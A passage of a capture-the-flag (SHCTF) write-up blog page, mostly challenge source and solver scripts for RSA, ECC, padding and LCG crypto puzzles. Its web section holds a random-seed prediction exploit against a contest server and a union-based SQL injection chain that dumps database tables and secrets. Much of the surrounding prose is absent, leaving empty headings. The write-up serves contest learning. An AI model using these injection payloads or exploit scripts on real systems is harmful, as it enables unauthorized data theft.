10828571852464331341712150217058916119291334034775990469361200035678740509774480669454106468384506195444300931477689490439063149020461676127989241184154737</span></span><br><span class="line"><span class="comment"># q = 7612918354236349590305500410457447666517294016150410935511115244808748864036428494251452016172971676206380973588984417215894793791556907054138118188367171</span></span><br><span class="line"><span class="comment"># b&#x27;SHCTF&#123;39066b49-7c3f-47a3-a7d7-546c11048817&#125;&#x27;</span></span><br><span class="line"><span class="comment"># 64%</span></span><br></pre></td></tr></table></figure><h2 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> misc</h2><h3 id=""><a class="markdownIt-Anchor" href="#"></a> </h3><p><code>SHCTF</code></p><h3 id="1"><a class="markdownIt-Anchor" href="#1"></a> </h3><p><code>png</code>crc<code>python Deformed-Image-Restorer.py -i roxy.png</code></p><h3 id=""><a class="markdownIt-Anchor" href="#"></a> ?!</h3><p><code>SHCTF??????FTCHS</code></p><h3 id="rasterizing-traffic"><a class="markdownIt-Anchor" href="#rasterizing-traffic"></a> Rasterizing Traffic()</h3><p><code>fake flag</code><code>grating.png</code><br /><img src="https://picx.zhimg.com/80/v2-a874991b942575ee60299a796ccf2d4a_1440w.png" alt="" /><br /></p><h1 id="week2"><a class="markdownIt-Anchor" href="#week2"></a> week2</h1><h2 id="web-2"><a class="markdownIt-Anchor" href="#web-2"></a> web</h2><h3 id="guess_the_number"><a class="markdownIt-Anchor" href="#guess_the_number"></a> guess_the_number</h3><p><code>/s0urce</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, send_file</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, first_num = first_num)  </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/s0urce&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_source</span>():</span><br><span class="line">    file_path = <span class="string">&quot;app.py&quot;</span></span><br><span class="line">    <span class="keyword">return</span> send_file(file_path, as_attachment=<span class="literal">True</span>)</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/first&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_first_number</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(first_num)</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/guess&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_seed</span>():</span><br><span class="line">    num = request.args.get(<span class="string">&#x27;num&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> num == <span class="built_in">str</span>(second_num):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            <span class="keyword">return</span> file.read()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;nonono&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">    <span class="keyword">global</span> seed, first_num, second_num</span><br><span class="line">    seed = random.randint(<span class="number">1000000</span>,<span class="number">9999999</span>)</span><br><span class="line">    random.seed(seed)</span><br><span class="line">    first_num = random.randint(<span class="number">1000000000</span>,<span class="number">9999999999</span>)</span><br><span class="line">    second_num = random.randint(<span class="number">1000000000</span>,<span class="number">9999999999</span>)</span><br><span class="line"></span><br><span class="line">init()</span><br><span class="line">app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">first_num = <span class="number">5277451103</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">1000000</span>, <span class="number">9999999</span>)):</span><br><span class="line">    random.seed(i)</span><br><span class="line">    test = random.randint(<span class="number">1000000000</span>, <span class="number">9999999999</span>)</span><br><span class="line">    <span class="keyword">if</span> test == first_num:</span><br><span class="line">        second_num = random.randint(<span class="number">1000000000</span>, <span class="number">9999999999</span>)</span><br><span class="line">        res = requests.get(</span><br><span class="line">            <span class="string">f&#x27;http://210.44.150.15:25622/guess?num=<span class="subst">&#123;second_num&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(res.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id=""><a class="markdownIt-Anchor" href="#"></a> </h3><p><code>?id=&quot;) or 1=1#</code><br /><img src="https://picx.zhimg.com/80/v2-eb4952a524f61c3edf5729c210877257_1440w.png" alt="" /></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username,password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> (&quot;1&quot;) <span class="keyword">or</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database()#</span><br><span class="line">ctf</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> username,password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> (&quot;1&quot;) <span class="keyword">or</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctf&#x27;</span>#</span><br><span class="line">flag,users</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> username,password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> (&quot;1&quot;) <span class="keyword">or</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span>#</span><br><span class="line">flagid,scretdata</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> username,password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> (&quot;1&quot;) <span class="keyword">or</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span></span><br><span class="line">usersid,username,password,<span class="keyword">USER</span>,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> username,password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> (&quot;1&quot;) <span class="keyword">or</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(scretdata) <span class="keyword">from</span> flag#</span><br><span class="line">, ,</span><br></pre></td></tr></table></figure><p></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># </span><br><span class="line"><span class="keyword">SELECT</span> username,password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> (&quot;1&quot;) <span class="keyword">or</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">SELECT</span> database(),column_name <span class="keyword">FROM</span> information_schema.columns</span><br><span class="line"># </span><br><span class="line"><span class="keyword">SELECT</span> username,password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> (&quot;1&quot;) <span class="keyword">or</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">SELECT</span> database(),column_comment <span class="keyword">FROM</span> information_schema.columns</span><br></pre></td></tr></table></figure><h2 id="crypto-2"><a class="markdownIt-Anchor" href="#crypto-2"></a> crypto</h2><h3 id="worde"><a class="markdownIt-Anchor" href="#worde"></a> worde</h3><p></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> enc <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = getPrime(<span class="number">200</span>)</span><br><span class="line">d = gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">dp = d % (p-<span class="number">1</span>)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;dp = <span class="subst">&#123;dp&#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 82247919658489810380240839087349167312391675556067956600144360018088524333106039088812004869379422909437743425492911024763226188814125737536109723777661903520234200005812281602815883855435148880431018374620973909944500345461605934516034328785791858741385301710414531253610756328999895737908157933318003199437</span></span><br><span class="line"><span class="string">c = 19004135050577774560981288431097099079736191413880885912007978892726509267290991113342873896047249218117502631896913170767293584589689916540020860025359287210204445330821495515587691705398818016395710639666764267452777850179744742716838946605733861264261086076963704643146910966580500292644632757738898750640</span></span><br><span class="line"><span class="string">e = 1222271536436538502303564845180492076631965040858206171530223</span></span><br><span class="line"><span class="string">dp = 5756836428205079089595585945891670886537656746897710776494815731928932139888141976203071290262270694899459619924115230892248604680645140941830553958594301</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><a href="https://hvang10.github.io/2024/08/12/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%B1%B1%E7%9F%B3CTF%E8%AE%AD%E7%BB%83%E8%90%A5/">https://hvang10.github.io/2024/08/12/CTF/</a><br /><code>babyrsa</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p = GCD(<span class="built_in">pow</span>(<span class="number">2</span>, e*dp, n)-<span class="number">2</span>, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, dp, p)))</span><br></pre></td></tr></table></figure><h3 id=""><a class="markdownIt-Anchor" href="#"></a> </h3><p></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line"><span class="keyword">from</span> enc <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_primes</span>(<span class="params">limit</span>):</span><br><span class="line">    primes = []</span><br><span class="line">    is_prime = [<span class="literal">True</span>] * (limit + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, limit + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> is_prime[num]:</span><br><span class="line">            primes.append(num)</span><br><span class="line">            <span class="keyword">for</span> multiple <span class="keyword">in</span> <span class="built_in">range</span>(num * num, limit + <span class="number">1</span>, num):</span><br><span class="line">                is_prime[multiple] = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> primes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_Prime</span>(<span class="params">bits</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        n = <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> n.bit_length() &lt; bits:</span><br><span class="line">            n *= choice(primes)</span><br><span class="line">        <span class="keyword">if</span> isPrime(n + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> n + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">primes = get_primes(e)</span><br><span class="line">p = get_Prime(<span class="number">512</span>)</span><br><span class="line">q = get_Prime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 33049334433301642832276449462878199425586003075363704632299361359635418571202120149638949400299018113342381561003380476578452867397448279205470367999826880102323557636492461892702632205491422046049109130726973943645824051991662952301697690337766318065326751352192106485980054784289527854584092550645702701746223881</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">c = 15394419310248814507510133312306135076155666347831968302673818044165993197079455389123001640582969004883715894754137770792509616543743423839219703779259418731422736400578259902468529503256749854724887132016186964074984277399760948419395368792639982783770903783472249503330890702692418839718262891255865389875185554</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><code>get_primes()</code><code>Sieve of Eratosthenes</code><code>isPrime(n + 1)</code><code>p-1</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Poolard_p_1</span>(<span class="params">N</span>):</span><br><span class="line">    a, n = <span class="number">2</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a = <span class="built_in">pow</span>(a, n, N)</span><br><span class="line">        res = GCD(a-<span class="number">1</span>, N)</span><br><span class="line">        <span class="keyword">if</span> res != <span class="number">1</span> <span class="keyword">and</span> res != N:</span><br><span class="line">            q = N // res</span><br><span class="line">            <span class="keyword">return</span> res, q</span><br><span class="line">        n += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">p, q = Poolard_p_1(n)</span><br><span class="line">d = inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n)).decode())</span><br></pre></td></tr></table></figure><h3 id="ezecc"><a class="markdownIt-Anchor" href="#ezecc"></a> ezECC</h3><p></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">b&#x27;SHCTF&#123;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">m = next_prime(bytes_to_long(flag))</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">a,b = getPrime(<span class="number">128</span>),getPrime(<span class="number">128</span>)</span><br><span class="line">E = EllipticCurve(Zmod(p),[a,b])</span><br><span class="line">k = getPrime(<span class="number">256</span>)</span><br><span class="line">A1 = E.random_point()</span><br><span class="line">A2 = A1*k</span><br><span class="line">M = E.lift_x(m)</span><br><span class="line">C = M+A2</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p = &#x27;</span>,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;k = &#x27;</span>,k)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;A1 = &#x27;</span>,A1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;C = &#x27;</span>,C)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">p =  9799485259524549113003780400336995829253375211044694607315372450399356814285244762186468904824132005209991983177601498069896166228214442123763065076327679</span></span><br><span class="line"><span class="string">k =  73771953838487511457389800773038323262861649769228176071578897500004883270121</span></span><br><span class="line"><span class="string">A1 =  (5945412329827707694132352090606154232045921322662767755331097180167148601629747751274580872108985870208681845078153424348847330421799769770041805208089791 : 4113102573821904570542216004200810877456931033522276527318388416329888348077285857968081007666714313806776668203284797556825595791189566621228705928598709 : 1)</span></span><br><span class="line"><span class="string">C = (2336301464307188733995312208152021176388718095735565422234047912672553316288080052957448196669174030921526180747767251838308335308474037066343018337141276 : 6868888273736103386336636953449998615833854869329393895956720058438723636197866928342387693671211918574357564701700555086194574821628053750572619551290025 : 1)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>ab</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p =  <span class="number">9799485259524549113003780400336995829253375211044694607315372450399356814285244762186468904824132005209991983177601498069896166228214442123763065076327679</span></span><br><span class="line">k =  <span class="number">73771953838487511457389800773038323262861649769228176071578897500004883270121</span></span><br><span class="line">A1 =  (<span class="number">5945412329827707694132352090606154232045921322662767755331097180167148601629747751274580872108985870208681845078153424348847330421799769770041805208089791</span> , <span class="number">4113102573821904570542216004200810877456931033522276527318388416329888348077285857968081007666714313806776668203284797556825595791189566621228705928598709</span>)</span><br><span class="line">C = (<span class="number">2336301464307188733995312208152021176388718095735565422234047912672553316288080052957448196669174030921526180747767251838308335308474037066343018337141276</span> , <span class="number">6868888273736103386336636953449998615833854869329393895956720058438723636197866928342387693671211918574357564701700555086194574821628053750572619551290025</span>)</span><br><span class="line">a=<span class="built_in">int</span>(inverse(A1[<span class="number">0</span>]-C[<span class="number">0</span>],p)*(A1[<span class="number">1</span>]^<span class="number">2</span>-C[<span class="number">1</span>]^<span class="number">2</span>-A1[<span class="number">0</span>]^<span class="number">3</span>+C[<span class="number">0</span>]^<span class="number">3</span>)%p)</span><br><span class="line">b=<span class="built_in">int</span>((A1[<span class="number">1</span>]^<span class="number">2</span>-A1[<span class="number">0</span>]^<span class="number">3</span>-a*A1[<span class="number">0</span>])%p)</span><br><span class="line">E = EllipticCurve(Zmod(p),[a,b])</span><br><span class="line">C = E.point(C)</span><br><span class="line">A1 = E.point(A1)</span><br><span class="line">m = C-A1*k</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;m = <span class="subst">&#123;m[<span class="number">0</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># python</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line">m = <span class="number">133829459905635890502862981237631940794467118483270617546174979</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line">m1 = prevprime(m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m1))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m1, m):</span><br><span class="line">    flag = long_to_bytes(i)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;&#125;&#x27;</span> == flag[-<span class="number">1</span>:]:</span><br><span class="line">        <span class="built_in">print</span>(flag.decode())</span><br></pre></td></tr></table></figure><h3 id="pading"><a class="markdownIt-Anchor" href="#pading"></a> pading</h3><p></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">flag = <span class="string">b&#x27;SHCTF&#123;********&#125;&#x27;</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">39</span></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">0x3</span></span><br><span class="line">pad = <span class="string">b&#x27;a_easy_problem&#x27;</span></span><br><span class="line">c = <span class="built_in">pow</span>(bytes_to_long(flag + pad),e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 97267171048088381496066192626635197453217164564868791036244179896351325689651647300515730561304963255114869511478914996031421842629280169299477338281118325550531655231549821271665600124109279443980829977781199806450042470016020636640703547622978932751689687167828765412348742136309101175003219210818245550233</span></span><br><span class="line"><span class="string">c = 45010260588576847169114899728599361533379262804019563744039173126890376093283589687354320048969349244237974443778624464334226062734150084458832462402162698053900389565767914602287253167328691766940007844822055298249437834407081828025295154876721602702763359699362974932711252222438004294561141105423731699107</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>m</strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">97267171048088381496066192626635197453217164564868791036244179896351325689651647300515730561304963255114869511478914996031421842629280169299477338281118325550531655231549821271665600124109279443980829977781199806450042470016020636640703547622978932751689687167828765412348742136309101175003219210818245550233</span></span><br><span class="line">c = <span class="number">45010260588576847169114899728599361533379262804019563744039173126890376093283589687354320048969349244237974443778624464334226062734150084458832462402162698053900389565767914602287253167328691766940007844822055298249437834407081828025295154876721602702763359699362974932711252222438004294561141105423731699107</span></span><br><span class="line">m_high = bytes_to_long(<span class="string">b&#x27;SHCTF&#123;&#x27;</span>)</span><br><span class="line">m_low = bytes_to_long(<span class="string">b&#x27;&#125;a_easy_problem&#x27;</span>)</span><br><span class="line"><span class="comment"># 6+32+15</span></span><br><span class="line">R.&lt; x &gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = ((m_high &lt;&lt; <span class="number">376</span>)+x*<span class="number">2</span> ^ <span class="number">120</span>+m_low)^<span class="number">3</span>-c</span><br><span class="line">f = f.monic()</span><br><span class="line"><span class="comment"># m256</span></span><br><span class="line">roots = f.small_roots(X=<span class="number">2</span> ^ <span class="number">256</span>, beta=<span class="number">0.4</span>,epsilon=<span class="number">0.02</span>)</span><br><span class="line"><span class="keyword">for</span> root <span class="keyword">in</span> roots:</span><br><span class="line">    m = (m_high &lt;&lt; <span class="number">376</span>)+<span class="built_in">int</span>(root)*<span class="number">2</span> ^ <span class="number">120</span>+m_low</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)).decode())</span><br></pre></td></tr></table></figure><h3 id="er"><a class="markdownIt-Anchor" href="#er"></a> E&amp;R</h3><p></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">flag = flag[<span class="number">6</span>:-<span class="number">1</span>]</span><br><span class="line">l = <span class="built_in">len</span>(flag)</span><br><span class="line">m1 = bytes_to_long(flag[:l//<span class="number">2</span>])</span><br><span class="line">m2 = bytes_to_long(flag[l//<span class="number">2</span>:])</span><br><span class="line"><span class="comment">#RSA</span></span><br><span class="line">p = getPrime(<span class="number">256</span>)</span><br><span class="line">q = getPrime(<span class="number">256</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">r_q = <span class="built_in">int</span>(<span class="built_in">bin</span>(q)[<span class="number">2</span>:][::-<span class="number">1</span>] , <span class="number">2</span>)</span><br><span class="line">leak = p ^^ r_q</span><br><span class="line">c = <span class="built_in">pow</span>(m2,e,n)</span><br><span class="line"></span><br><span class="line"><span class="comment">#ECC</span></span><br><span class="line">E = EllipticCurve(Zmod(n),[<span class="number">114514</span>,<span class="number">1919810</span>])</span><br><span class="line">G = E.lift_x(Integer(m1))</span><br><span class="line">P = G * e</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;leak = <span class="subst">&#123;leak&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;P = <span class="subst">&#123;P&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># leak = 5599968251197363876087002284371721787318931284225671549507477934076746561842</span></span><br><span class="line"><span class="comment"># n = 7120275986401660066259983193598830554385933355254283093021239164350142898387660104515624591378875067038235085428170557400012848874756868985306042421950909</span></span><br><span class="line"><span class="comment"># c = 6803450117490196163076010186755045681029929816618361161925865477601994608941714788803007124967390157378525581080320415602012078322064392991884070073083436</span></span><br><span class="line"><span class="comment"># P = (4143131125485719352848137000299706175276016714942734255688381872061184989156686585992844083387698688432978380177564346382756951426943827434190895490233627 : 3879946878859691332371384275396678851932267609535096278038417524609690721322205780110680003522999409696718745532857001461869452116434787256032366267905519 : 1)</span></span><br></pre></td></tr></table></figure><p><code>leak = p ^^ r_q</code><code>p</code><code>q</code><br /><code>n</code>()<code>ECC</code><code>p</code><code>Zmod(p)</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">7120275986401660066259983193598830554385933355254283093021239164350142898387660104515624591378875067038235085428170557400012848874756868985306042421950909</span></span><br><span class="line">c = <span class="number">6803450117490196163076010186755045681029929816618361161925865477601994608941714788803007124967390157378525581080320415602012078322064392991884070073083436</span></span><br><span class="line">P = (<span class="number">4143131125485719352848137000299706175276016714942734255688381872061184989156686585992844083387698688432978380177564346382756951426943827434190895490233627</span> , <span class="number">3879946878859691332371384275396678851932267609535096278038417524609690721322205780110680003522999409696718745532857001461869452116434787256032366267905519</span>)</span><br><span class="line">p, q = <span class="number">64760524083545528318139240449356269097871629401328435356643510319660757701117</span>, <span class="number">109947782034870726628911928816041880655659770652764045401662566933641952899777</span></span><br><span class="line">E = EllipticCurve(Zmod(p),[<span class="number">114514</span>,<span class="number">1919810</span>])</span><br><span class="line">d = inverse(e,E.order())</span><br><span class="line">P = E.point(P)</span><br><span class="line">G = P*d</span><br><span class="line">m1 = long_to_bytes(<span class="built_in">int</span>(G[<span class="number">0</span>])).decode()</span><br><span class="line">m2 = long_to_bytes(<span class="built_in">int</span>(<span class="built_in">pow</span>(c, inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>)), n))).decode()  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;SHCTF&#123;&#x27;</span>+m1+m2+<span class="string">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="misc-2"><a class="markdownIt-Anchor" href="#misc-2"></a> misc</h2><h3 id="2"><a class="markdownIt-Anchor" href="#2"></a> </h3><p><img src="https://pic1.zhimg.com/80/v2-5461fd30fd23e433086e0a154e8e6fbe_1440w.png" alt="" /><br /><code>IDAT</code></p><h3 id="ccrc"><a class="markdownIt-Anchor" href="#ccrc"></a> ?CCRC!()</h3><p></p><h1 id="week3"><a class="markdownIt-Anchor" href="#week3"></a> week3</h1><h2 id="crypto-3"><a class="markdownIt-Anchor" href="#crypto-3"></a> Crypto</h2><p></p><h3 id="babylcg"><a class="markdownIt-Anchor" href="#babylcg"></a> babyLCG</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> enc <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">seed = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">a = getPrime(<span class="number">400</span>)</span><br><span class="line">b = getPrime(<span class="number">400</span>)</span><br><span 